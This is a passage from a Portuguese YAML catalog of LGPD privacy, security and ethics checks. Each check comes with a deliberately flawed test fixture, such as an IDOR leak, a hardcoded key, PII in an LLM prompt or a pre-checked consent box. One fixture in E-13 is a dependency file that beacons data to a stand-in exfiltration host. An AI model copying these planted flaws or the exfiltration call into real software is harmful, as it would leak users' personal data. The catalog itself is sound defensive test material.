      espera_severidade: CRITICO
  P-09:
    pack: privacy
    domain: [data, api]
    titulo: k-anonimato em agregacoes de BI
    base_legal: reidentificacao
    tipo: estatico+runtime
    modo: active
    fase: 3
    status: implementado
    canonical_mutation:
      descricao: agregacao exposta devolve celula com 2 titulares
      runtime:
        autorizacao_valida: true
        modo: pse_active
        endpoints:
          agregacao: /api/relatorios/bairro
        respostas:
          - status: 200
            corpo: '{"linhas":[{"bairro":"X","count":2}]}'
      espera_severidade: ALTO
  P-10:
    pack: privacy
    domain: [api]
    titulo: Portabilidade — endpoint de exportacao existe e responde
    base_legal: LGPD Art. 18 V
    tipo: runtime
    modo: active
    fase: 3
    status: implementado
    canonical_mutation:
      descricao: exportacao responde sem hash e sem estrutura declarada
      runtime:
        autorizacao_valida: true
        modo: pse_active
        endpoints:
          exportacao: /api/exportacao
        respostas:
          - status: 200
            corpo: '{"itens":[{"a":1}]}'
      espera_severidade: ALTO
  P-11:
    pack: privacy
    domain: [api]
    titulo: Oraculo de existencia — 403 vs 404 distinguivel
    base_legal: profiling
    tipo: estatico+runtime
    modo: active
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: recurso alheio responde 403 e inexistente responde 404
      runtime:
        autorizacao_valida: true
        modo: pse_active
        recursos_b:
          - /api/clientes/9f1c2e3a-0000-4000-8000-000000000000
        endpoints:
          inexistente: /api/clientes/00000000-0000-4000-8000-000000000000
        respostas:
          - status: 404
            corpo: '{}'
          - status: 403
            corpo: '{}'
      espera_severidade: CRITICO

  # -------------------------------------------------- Pacote S — Seguranca
  S-01:
    pack: security
    domain: [api]
    titulo: BOLA/IDOR — recurso de titular sem assertOwnership
    base_legal: OWASP API1
    tipo: estatico+runtime
    modo: active
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: token de A obtem 200 num recurso declarado do titular B
      runtime:
        autorizacao_valida: true
        modo: pse_active
        recursos_b:
          - /api/clientes/9f1c2e3a-0000-4000-8000-000000000000
        respostas:
          - status: 200
            corpo: '{"id":"9f1c2e3a-0000-4000-8000-000000000000","cpf":"529.982.247-25"}'
      espera_severidade: CRITICO
  S-02:
    pack: security
    domain: [api]
    titulo: Rate limit + paginacao por cursor (anti-extracao em massa)
    base_legal: OWASP API4
    tipo: runtime
    modo: active
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: listagem responde 200 indefinidamente, sem bloqueio
      runtime:
        autorizacao_valida: true
        modo: pse_active
        endpoints:
          listagem: /api/clientes
        respostas:
          - status: 200
            corpo: '{"itens":[]}'
      espera_severidade: ALTO
  S-03:
    pack: security
    domain: [api]
    titulo: Erros e webhooks sem PII no payload
    base_legal: LGPD Art. 46
    tipo: estatico+runtime
    modo: passive
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: payload de erro devolve CPF e e-mail do titular
      runtime:
        autorizacao_valida: true
        modo: pse_passive
        endpoints:
          erro: /api/nao-existe
        respostas:
          - status: 500
            corpo: '{"erro":"falha ao salvar cpf=529.982.247-25 de maria@empresa.com.br"}'
      espera_severidade: ALTO
  S-04:
    pack: security
    domain: [backend]
    titulo: Manifesto de terceiros — host externo registrado com DPA
    base_legal: LGPD Art. 39
    tipo: estatico
    modo: inventory
    fase: 1
    status: implementado
    canonical_mutation:
      descricao: host de terceiro no codigo sem entrada no manifesto
      arquivos:
        app.py: |
          import requests


          def enviar():
              requests.post("https://analytics.google.com/collect", json={})
      espera_severidade: ALTO
  S-05:
    pack: security
    domain: [backend, data]
    titulo: Payload minimo de egresso — schema por destino, PII proibida
    base_legal: LGPD Art. 6o III
    tipo: estatico+runtime
    modo: active
    fase: 3
    status: implementado
    canonical_mutation:
      descricao: integracao no manifesto sem egress_fields declarados
      arquivos:
        tp.yml: |
          integrations:
            - name: analytics
              hosts: [a.example.net]
              dpa_signed: true
      config:
        {third_party_manifest: tp.yml}
      espera_severidade: ALTO
  S-06:
    pack: security
    domain: [backend]
    titulo: Chave por parceiro — nenhuma API key global/hardcoded
    base_legal: LGPD Art. 46
    tipo: estatico
    modo: inventory
    fase: 1
    status: implementado
    canonical_mutation:
      descricao: credencial de parceiro hardcoded
      arquivos:
        app.py: |
          api_key = "sk-live-plantada-0123456789"
      espera_severidade: CRITICO
  S-07:
    pack: security
    domain: [api, backend]
    titulo: Propagacao de finalidade (X-Purpose) + log de auditoria estruturado
    base_legal: LGPD Art. 37
    tipo: estatico+runtime
    modo: active
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: requisicao sem X-Purpose e atendida com 200
      runtime:
        autorizacao_valida: true
        modo: pse_active
        endpoints:
          listagem: /api/clientes
          log_auditoria: /api/logs
        respostas:
          - status: 200
            corpo: '[{"ator":"u1","acao":"read","timestamp":"2026-08-06","recurso":"c1","finalidade":"cobranca"}]'
      espera_severidade: ALTO
  S-08:
    pack: security
    domain: [data, backend]
    titulo: Transferencia internacional exige base declarada no manifesto
    base_legal: LGPD Art. 33
    tipo: estatico
    modo: inventory
    fase: 1
    status: implementado
    canonical_mutation:
      descricao: destino fora do BR sem base de transferencia declarada
      arquivos:
        tp.yml: |
          integrations:
            - name: parceiro-us
              hosts: [api.parceiro.example.net]
              dpa_signed: true
              data_residency: US
      config:
        third_party_manifest: tp.yml
      espera_severidade: ALTO

  # -------------------------------------------------- Pacote E — Etica
  E-00:
    pack: ethics
    domain: [ai]
    titulo: Escopo do pack de etica (guarda) — ha decisao automatizada sobre pessoas?
    base_legal: EbD-AI
    tipo: estatico
    modo: inventory
    fase: 1
    status: implementado
    guarda_de_pack: true
    canonical_mutation:
      descricao: codigo mostra modelo de ML e o consumidor declara decision_making none
      arquivos:
        ml.py: |
          from sklearn.linear_model import LogisticRegression

          modelo = LogisticRegression()
      config:
        decision_making: none
      espera_severidade: ALTO
  E-01:
    pack: ethics
    domain: [ai, api]
    titulo: Decisao automatizada sem explicacao (motivo/fatores/reason_code)
    base_legal: LGPD Art. 20
    tipo: estatico+runtime
    modo: passive
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: decisao devolvida sem motivo nem fatores
      runtime:
        autorizacao_valida: true
        modo: pse_passive
        endpoints:
          decisao: /api/decisoes/ultima
        respostas:
          - status: 200
            corpo: '{"aprovado":false}'
      espera_severidade: ALTO
  E-02:
    pack: ethics
    domain: [ai, backend]
    titulo: Decision log estruturado (modelo_v, features, score, limiar, revisor)
    base_legal: LGPD Art. 20/37
    tipo: estatico+runtime
    modo: passive
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: decisao sem modelo, features, score, limiar e revisor
      runtime:
        autorizacao_valida: true
        modo: pse_passive
        endpoints:
          decisao: /api/decisoes/ultima
        respostas:
          - status: 200
            corpo: '{"aprovado":false,"motivo":"score baixo"}'
      espera_severidade: ALTO
  E-03:
    pack: ethics
    domain: [api]
    titulo: Contestacao — endpoint de recurso com protocolo e SLA
    base_legal: LGPD Art. 18
    tipo: runtime
    modo: active
    fase: 2
    status: implementado
    canonical_mutation:
      descricao: contestacao aceita sem protocolo e sem prazo
      runtime:
        autorizacao_valida: true
        modo: pse_active
        endpoints:
          contestacao: /api/contestacoes
        respostas:
          - status: 201
            corpo: '{"status":"recebido"}'
      espera_severidade: ALTO
  E-04:
    pack: ethics
    domain: [ai, backend]
    titulo: HITL — decisoes criticas com rota de revisao humana
    base_legal: LGPD Art. 20 §3
    tipo: estatico
    modo: inventory
    fase: 1
    status: implementado
    canonical_mutation:
      descricao: decisao de alto impacto sem nenhuma rota de revisao humana
      arquivos:
        app.py: |
          def negar_credito(user, score):
              if score < 500:
                  return {"aprovado": False}
              return {"aprovado": True}
      config:
        decision_making: automated
      espera_severidade: CRITICO
  E-05:
    pack: ethics
    domain: [ai]
    titulo: Proxy de discriminacao — feature proibida no pipeline
    base_legal: LGPD Art. 6o IX
    tipo: estatico
    modo: inventory
    fase: 1
    status: implementado
    canonical_mutation:
      descricao: proxy de discriminacao no score sem ajuste de fairness
      arquivos:
        score.py: |
          def calcular_score(renda, cep):
              return renda * 0.4 + int(cep[:2]) * 0.1
      config:
        decision_making: automated
      espera_severidade: ALTO
  E-06:
    pack: ethics
    domain: [ai, data]
    titulo: Drift de disparidade — DPD por grupo vs baseline
    base_legal: nao-discriminacao
    tipo: ci
    modo: inventory
    fase: 3
    status: implementado
    canonical_mutation:
      descricao: dataset de avaliacao declarado sem relatorio de fairness
      arquivos:
        eval.csv: |
          grupo,alvo
          A,1
          B,0
      config:
        {packs: {ethics: {fairness_dataset: eval.csv}}}
      espera_severidade: ALTO
  E-07:
    pack: ethics
    domain: [ai]
    titulo: Model Card + Datasheet presentes, versionados e validos
    base_legal: EbD-AI / LGPD Art. 20
    tipo: estatico
    modo: inventory
    fase: 1
    status: implementado
    canonical_mutation:
      descricao: codigo de ML sem Model Card versionado
      arquivos:
        ml.py: |
          from sklearn.linear_model import LogisticRegression

          modelo = LogisticRegression()
      config:
        decision_making: automated
      espera_severidade: ALTO
  E-08:
    pack: ethics
    domain: [data]
    titulo: Provenance/lineage — origem, transformacao e destino rastreaveis
    base_legal: rastreabilidade (LGPD Art. 37)
    tipo: estatico
    modo: inventory
    fase: 3
    supports: [P-04, S-04, E-12]
    status: implementado
    canonical_mutation:
      descricao: catalogo com dado pessoal e nenhuma trilha de proveniencia
      arquivos:
        catalog.yaml: |
          tables:
            clientes:
              fields:
                cpf:
                  class: personal
                  owner: financeiro
                  purpose: cobranca
                  legal_basis: contrato
                  retention_years: 5
        README.md: |
          # Governanca
          Temos rastreabilidade de lineage completa e auditavel.
      config:
        catalog_path: catalog.yaml
      espera_severidade: ALTO
  E-09:
    pack: ethics
    domain: [ai, api]
    titulo: Kill switch / modo degradado digno, documentado e testavel
    base_legal: controle humano
    tipo: runtime
    modo: active
    fase: 3
    status: implementado
    canonical_mutation:
      descricao: kill switch aceita e confirma simulacao, mas nao declara o efeito
      runtime:
        autorizacao_valida: true
        modo: pse_active
        endpoints:
          kill_switch_dry_run: /api/kill-switch
        respostas:
          - status: 200
            corpo: '{"dry_run":true,"status":"simulado"}'
      espera_severidade: ALTO
  E-10:
    pack: ethics
    domain: [ai]
    titulo: Incerteza quantificada em decisoes pontuais
    base_legal: robustez
    tipo: estatico
    modo: inventory
    fase: 3
    status: implementado
    canonical_mutation:
      descricao: inferencia pontual sem nenhuma medida de confianca
      arquivos:
        score.py: |
          def decidir(modelo, x):
              return modelo.predict(x)
      espera_severidade: MEDIO

  # --- IA e cadeia de terceiros (E-11..E-13) -------------------------------
  # Ficam no pack `ethics` porque o prefixo do ID fixa o pack, e o ID foi
  # ratificado como E-*. Na regra de fronteira do plano v1 (§2, "o check mora
  # no submodulo cujo OBJETO ele examina") E-11 tenderia a privacy e E-13 a
  # security; a coesao do prefixo venceu, e o `supports` abaixo registra o
  # parentesco para que a sobreposicao seja referencia cruzada, nunca duplicacao.
  # E-11 entra no conjunto CRITICO (fail-closed), ratificado no pedido.
  E-11:
    pack: ethics
    domain: [ai, backend]
    titulo: PII em prompt de LLM sem redacao
    base_legal: LGPD Art. 46 + Art. 42 (responsabilidade solidaria)
    tipo: estatico
    modo: inventory
    fase: 4
    status: implementado
    supports: [P-01, S-04]
    canonical_mutation:
      descricao: dado pessoal interpolado cru em chamada a modelo de linguagem
      arquivos:
        a.py: |
          import llm


          def resumir(user):
              # TODO: redact algum dia
              return llm.complete(f"cliente {user.cpf} reclamou")
      espera_severidade: CRITICO
  E-12:
    pack: ethics
    domain: [ai, data]
    titulo: Embedding/hash exportado como se fosse anonimo
    base_legal: LGPD Art. 12 + Art. 42 (responsabilidade solidaria)
    tipo: estatico
    modo: inventory
    fase: 4
    status: implementado
    supports: [P-04, S-05]
    canonical_mutation:
      descricao: derivado exportado com campo de origem ausente do catalogo
      arquivos:
        a.py: |
          def indexar(u):
              embedding_do_usuario = modelo.encode(u.nome_completo)
              broker.send(embedding_do_usuario)
        catalog.yaml: |
          tables:
            contratos:
              fields:
                valor:
                  class: anonymized
                  owner: financeiro
                  purpose: relatorio
                  legal_basis: contrato
                  retention_years: 5
      config:
        catalog_path: catalog.yaml
      espera_severidade: ALTO
  E-13:
    pack: ethics
    domain: [backend]
    titulo: Dependencia com host nao declarado no manifesto
    base_legal: LGPD Art. 39 + Art. 42 (responsabilidade solidaria)
    tipo: estatico
    modo: inventory
    fase: 4
    status: implementado
    supports: [S-04, S-08]
    canonical_mutation:
      descricao: host dentro de node_modules ausente do manifesto de terceiros
      arquivos:
        node_modules/rastreador/index.js: |
          export function t(e) {
            navigator.sendBeacon("https://telemetria.exfil.example.net/c", e);
          }
        tp.yml: |
          integrations:
            - name: outro
              hosts: [api.outro.example.net]
              dpa_signed: true
              egress_fields: [id_pseudonimo]
      config:
        third_party_manifest: tp.yml
      espera_severidade: ALTO

  # --- Dominio FRONTEND (FE-*) --------------------------------------------
  # Primeiro estrato onde o ID codifica o DOMINIO, nao o pilar: cada FE-*
  # declara `pack` explicitamente. Ver ressalva de nomenclatura no relatorio.
  # Os tres nascem sobre AST real (tree-sitter); o grep do material de
  # fundacao serve para achar ONDE olhar, jamais como check (D-01).
  P-13:
    pack: privacy
    domain: [frontend]
    titulo: Controle de consentimento pre-marcado
    base_legal: LGPD Art. 7o V e Art. 8o §1o (consentimento inequivoco)
    tipo: estatico
    modo: inventory
    fase: 5
    status: implementado
    supports: [P-07]
    canonical_mutation:
      descricao: checkbox de consentimento com checked literal e sem handler
      arquivos:
        C.jsx: |
          export const C = () => (
            <label>
              Aceito receber marketing
              <input type="checkbox" name="consent_ads" checked />
            </label>
          );
      espera_severidade: CRITICO
  P-14:
    pack: privacy
    domain: [frontend]
    titulo: PII no armazenamento do cliente ou na URL
    base_legal: LGPD Art. 46 + Art. 6o VII (seguranca e prevencao)
    tipo: estatico
    modo: inventory
    fase: 5
    status: implementado
    supports: [P-01, P-06]
    canonical_mutation:
      descricao: CPF gravado no localStorage e e-mail montado em query string
      arquivos:
        a.js: |
          export function salvar(user) {
